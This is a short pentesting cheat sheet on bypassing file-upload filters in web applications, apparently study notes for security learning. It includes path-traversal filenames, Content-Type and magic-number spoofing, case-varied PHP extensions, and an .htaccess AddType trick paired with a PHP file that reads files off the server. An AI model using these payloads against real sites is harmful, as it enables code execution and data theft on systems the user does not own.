# 

# File Upload Vulnerability

## ByPass Client Side Filterin

1. Turn of JavaScript But Make Sure the Website doesn't require Javascript in order to provide basic functionality.

2. Intercept and modify the incoming page. Using Burpsuite
   
   EX:
   
           1-Intercept on to get This Request 
           2-Right Click and choose -> Do Intercept
           3-Response This request 
           4-Forward
           5-And Delete JS code Filter

3. Send the file directly to the upload point.
   
   Why use the webpage with the filter,when you can send the file directly using a tool. like curl
   
       curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>

4. Edit Content-Type: header to
   
           1-Upload File With Accepted Extention
           2-Intercept This Request 
           3-Edit Content-Type to -> Content-Type:text/x-php or image/png -> would you want
           3-and Edit file Extention to what you want

5. File Upload via Path Traversal 
   
           Content-Disposition: form-data; name="avatar"; filename="../get_f_c.php"
           Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fget_f_c.php"
       
           GET /files/avatars/../get_f_c.php
           GET /files/avatars/..%2get_f_c.php

6. Test them using some uppercase letters
   
         pHp, .pHP5, .PhAr ...

7. using .htaccess file
   
   this file is the file of configration in appache you can add configration on it to accept any extension ike .shell , .test then you should aupload two fils file .htaccess 
   
   file One
   
       Content-Disposition: form-data; name="avatar"; filename=".htaccess"
       Content-Type: text/plain
       AddType application/x-httpd-php .shell
   
   flle Two
   
       Content-Disposition: form-data; name="avatar"; filename="shell.shell"
       Content-Type: image/png
       <?php echo file_get_contents('/path/to/target/file'); ?>

--- 

## ByPass ServerSide Filtering

1. First You have to perform a lot of testing to build up an idea of what is or is not allowed through the filter.

2. Try All Possible Extention work for The Same Thing You Want https://book.hacktricks.xyz/pentesting-web/file-upload

3. Magic Numbers
   
   see this site To Know Your Extention Magic Number
   
   https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5
   
   https://en.wikipedia.org/wiki/List_of_file_signatures
   
   Use Any hex editor to Edit First bits. Like hexeditor
   
   use Command `file filename` to know if the magic Numbers work
